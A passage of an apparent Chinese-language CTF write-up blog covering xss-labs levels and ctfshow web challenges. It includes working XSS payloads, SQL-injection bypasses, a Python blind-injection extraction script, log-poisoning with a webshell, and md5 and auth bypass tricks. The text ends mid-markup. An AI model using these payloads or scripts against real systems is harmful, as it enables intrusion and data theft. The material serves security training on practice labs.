href="https://blog.csdn.net/aleave/article/details/119853620">参考链接：</a></p><h4 id="什么是html实体编码？"><a href="#什么是html实体编码？" class="headerlink" title="什么是html实体编码？"></a>什么是html实体编码？</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">HTML 实体是一段以连字号（&amp;）开头、以分号（;）结尾的字符串。用以显示不可见字符及保留字符 (如 HTML 标<br>签)<br>在前端，一般为了避免 XSS 攻击，会将 &lt; &gt; 编码为 <span class="hljs-symbol">&amp;lt;</span> 与 <span class="hljs-symbol">&amp;gt;</span>，这些就是 HTML 实体编码。<br></code></pre></td></tr></table></figure><p>实体编码后，字符就变成了普通的字符，引号不能去闭合其他的引号，只是一个普通字符。</p><h4 id="HTML编码有以下几种方式"><a href="#HTML编码有以下几种方式" class="headerlink" title="HTML编码有以下几种方式"></a>HTML编码有以下几种方式</h4><ol><li><p>​    HTML实体编码，格式    <code>以&amp;符号开头，以;分号结尾的</code>   </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;textarea&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span><br>    <span class="hljs-symbol">&amp;lt;</span>img src=<span class="hljs-symbol">&amp;quot;</span>localhost<span class="hljs-symbol">&amp;quot;</span><span class="hljs-symbol">&amp;gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结果是：   </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;localhost&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>​    十进制的ASCLL编码,格式:    <code>以符号&amp;#开头，分号;结尾</code></p></li></ol><p>​    ascll编码对照表   </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;textarea&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span><br>    <span class="hljs-symbol">&amp;#60;</span><span class="hljs-symbol">&amp;#105;</span>mg src<span class="hljs-symbol">&amp;#61;</span>&quot;localhost&quot;<span class="hljs-symbol">&amp;#62;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3、Unicode字符编码,格式:    <code>以符号&amp;#开头，分号;结尾</code></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&lt;textarea name=<span class="hljs-string">&quot;&quot;</span> id=<span class="hljs-string">&quot;textarea&quot;</span> cols=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-keyword">rows</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;<br>  &lt;img src&amp;#0061;&amp;#0034;localhost&amp;#0034;&gt;<br>&lt;/textarea&gt;<br></code></pre></td></tr></table></figure><p>4、十六进制的ascll码，格式：    <code>以&amp;#x开头，分号;结尾</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;textarea&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>&amp;#<span class="hljs-attr">x3D</span>;&amp;#<span class="hljs-attr">x0022</span>;<span class="hljs-attr">localhost</span>&amp;#<span class="hljs-attr">x0022</span>;&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>题目描述与上题类似，但是查看源码，</p><p><img src="https://s2.loli.net/2022/12/16/HRO8Jz2XPnFAkM5.png" alt="image-20221216142830957"></p><p>提示链接不合法，于是我们推断可能链接需要有 http:&#x2F;&#x2F;  标识</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;http://&#x27;</span>)<br></code></pre></td></tr></table></figure><p>并且将 s 进行编码：</p><p>xss：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">java&amp;#x0073;<span class="hljs-attr">cript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;http://&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a href="http://www.jsons.cn/unicode">编码网址</a></p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>查看源代码：</p><p><img src="https://s2.loli.net/2022/12/16/QNczWPfLryZTpUi.png" alt="image-20221216151725316"></p><p>经过尝试，我们可以向 t_sort 输入框传入值，将 “  进行闭合，使用 onclick事件，并且将type进行显示</p><p>xss代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">?t_sort=<span class="hljs-string">&quot; onclick=alert(1) type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure><p>前面的type将后面的type给覆盖了，于是input框就回显出来了</p><p><img src="https://s2.loli.net/2022/12/16/WMEzZ791lRpkJst.png" alt="image-20221216152135827"></p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>查看源码：</p><p><img src="https://s2.loli.net/2022/12/16/LNJQ9MABwG1YRak.png" alt="image-20221216152300184"></p><p>发现，t_ref 输入框的value值为 前一个页面的url值</p><p>有经验可知，该value值应该为请求头中的 Referer</p><p>于是我们使用bp抓包</p><img src="https://s2.loli.net/2022/12/16/DiXYrtRF2IZw4VG.png" alt="image-20221216152619800" style="zoom: 33%;" /><p>我们可以修改Referer值，将引号闭合，使用相关事件：</p><p><img src="https://s2.loli.net/2022/12/16/T1MRsJo8ECgl67q.png" alt="image-20221216152809029"></p><p><img src="https://s2.loli.net/2022/12/16/DOwaFXVn8B4e369.png" alt="image-20221216152828401"></p><p>xss代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot; onmouseover=alert(1) type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>查看源码：</p><p><img src="https://s2.loli.net/2022/12/16/OpUA2KIQFk9onaT.png" alt="image-20221216152916353"></p><p>发现value值为 UA，于是bp抓包修改ua头即可，与上题类似</p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>bp抓包</p><p><img src="https://s2.loli.net/2022/12/16/SkomEfxwVBsqdJz.png" alt="image-20221216153048456"></p><p>该题为注入点在cookie</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot; onmouseover=alert(1) type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>加载不了</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>查看源码：</p><p><img src="https://s2.loli.net/2022/12/16/f5G7dKJQBZ8pPMi.png" alt="image-20221216154043491"></p><p><a href="https://www.runoob.com/angularjs/ng-ng-include.html">AngularJS <code>ng-include</code> 指令</a></p><p><strong>ng-include</strong>指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p><code>ng-include</code>属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p><p>**payload ** 我们包含第一关的漏洞即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">?src=<span class="hljs-string">&#x27;level1.php?name=&lt;a href=javascript:alert(1)&gt;aa&lt;/a&gt;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>查看源码：</p><p><img src="https://s2.loli.net/2022/12/16/iZfs3EXmhdFt2l7.png" alt="image-20221216155234482"></p><p>过滤了一些符号，以及script</p><p>由于过滤了 &#x2F; 斜杠，我们可以使用单标签，如 img，但是此处将空格过滤了，我们可以使用 %0a，%0c，%0d等等  进行分隔</p><p>于是构造xss</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">?keyword=<span class="language-xml">&lt;img%0Dsrc=x%0Aonerror=alert(1)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>我们发现，参数的值都传入了 src 中</p><p><img src="https://s2.loli.net/2022/12/16/Vln4xw39Z1KB2au.png" alt="image-20221216160006380"></p><p>观察可知，该处src 没有加引号，可以使用空格分隔，利用拼接，巧妙解题</p><p>构造xss</p><p><img src="https://s2.loli.net/2022/12/16/FvaVjmQJ6wLd3Ic.png" alt="image-20221216160748771"></p><p>我们使用google查看，鼠标移入该区域即可过关</p><p><img src="https://s2.loli.net/2022/12/16/nlYeDauG91IhBpF.png" alt="image-20221216160829527"></p><h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>与上题一样</p><h3 id="level19，20"><a href="#level19，20" class="headerlink" title="level19，20"></a>level19，20</h3><p>先放着</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss-labs(WriteUp)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web</title>
    <link href="/2023/08/24/web/"/>
    <url>/2023/08/24/web/</url>
    
    <content type="html"><![CDATA[<h2 id="【ctfshow】web"><a href="#【ctfshow】web" class="headerlink" title="【ctfshow】web"></a>【ctfshow】web</h2><h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>右键源代码，base64解密</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304102326124.png" alt="image-20230410232657026"></p><p>直接使用联合查询union进行注入，查到表flag中存在flag字段</p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>直接使用php伪协议</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111123109.png" alt="image-20230411112357995"></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>由于服务器是nginx，所以我们直接包含nginx日志文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111130533.png" alt="image-20230411113022497"></p><p>然后在浏览器UA中加上一句话木马，然后使用蚁剑连接</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111133195.png" alt="image-20230411113333159"></p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>ctype_alpha()</code>函数，判断是否只包含字母，它返回true -如果字符串只包含字母，否则返回FALSE。 </p><p><code>is_numeric()</code>用于检测变量是否为数字或数字字符串。</p><p>显然，我们需要使用一个纯数字和一个纯字母来绕过md5</p><blockquote><p>QNKCDZO</p><p>240610708</p></blockquote><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111139822.png" alt="image-20230411113931789"></p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>sql注入，过滤了空格，我们使用 <code>/**/</code>代替</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111142775.png" alt="image-20230411114245737"></p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111145380.png" alt="image-20230411114516347"></p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>sql注入，这里使用布尔盲注</p><p>过滤了空格，union，逗号，单引号等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://1ea7f8c2-f8ff-4e25-bf02-132c3d47e2a5.challenge.ctf.show/index.php?id=0/**/or/**/&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>s = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># payload = &quot;ascii(substr((select/**/database())/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;#&quot;.format(i,ord(j))  web8</span><br>        <span class="hljs-comment"># payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;#&quot;.format(i,ord(j))</span><br>        <span class="hljs-comment"># payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;#&quot;.format(i,ord(j))</span><br>        payload = <span class="hljs-string">&quot;ascii(substr((select/**/group_concat(flag)/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(j))<br>        text =requests.get(url=url+payload).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;If&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们使用<code>/**/</code>代替空格，使用16进制绕过单引号，使用<code>substr()</code>函数的 <code>from for</code>语法去避免使用逗号</p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>使用<code>dirmap</code>扫描出 <code>robots.txt</code>，访问：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/index.phps<br></code></pre></td></tr></table></figure><p>我们下载 <code>index.phps</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)&gt;<span class="hljs-number">10</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;password error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里使用了 <code>md5()</code>，并且设置了true参数：</p><img src="https://s2.loli.net/2023/04/11/hgm2uAFRWZJqfKN.png" alt="image-20230411132305698" style="zoom: 67%;" /><p>设置了true参数后，会将md5后的值转化为原始字符二进制形式，</p><p>所以如果<code>md5(,true)</code>后出现了 <code>&#39;or&#39;xxx</code>的形式就可以绕过了</p><p>php中存在这样的字符串：<code>ffifdyop</code> md5后可以转化为这种形式</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111327029.png" alt="image-20230411132722359"></p><p>我们将密码传过去得flag</p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>点击取消，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>        &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$username</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$password</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>这一题学到一个新的姿势，</p><p><code>group by</code> 后可以使用 <code>with rollup</code>，先进行分组，然后在分组结果上进行统计</p><p>例如，我们先查询出表的数据：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111343707.png" alt="image-20230411134338648"></p><p>然后我们分组看看：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111347191.png" alt="image-20230411134605729"></p><p>接着使用 <code>with rollup</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111348580.png" alt="image-20230411134806492"></p><p>我们发现它的作用是将分组结果进行统计，多了一条数据，但分组的那一列是 <code>NULL</code></p><p>因此我们可以使用它来绕过，然后我们密码为空，这样弱比较后就相等了</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111350968.png" alt="image-20230411135040934"></p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$password</span>)))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们把cookie给删除，然后密码为空就可绕过</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111353472.png" alt="image-20230411135359434"></p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>查看源码，发现 <code>?cmd=</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111358734.png" alt="image-20230411135840705"></p><p>推测是代码执行，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br>或<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;*&#x27;</span>));<br></code></pre></td></tr></table></figure><p>获得当前目录下的所有文件</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111400950.png" alt="image-20230411140019904"></p><p>然后查看源码即可：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">highlight_file(&#x27;903c<span class="hljs-number">0010</span>5c<span class="hljs-number">0141</span>fd37ff<span class="hljs-number">4769</span>7e916e<span class="hljs-number">5361</span>6e33a72fb<span class="hljs-number">3774</span>ab213b3e2a732f56f.php&#x27;);<br><br>show_source();<br></code></pre></td></tr></table></figure><h3 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h3><p>和上题一样，传参cmd得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 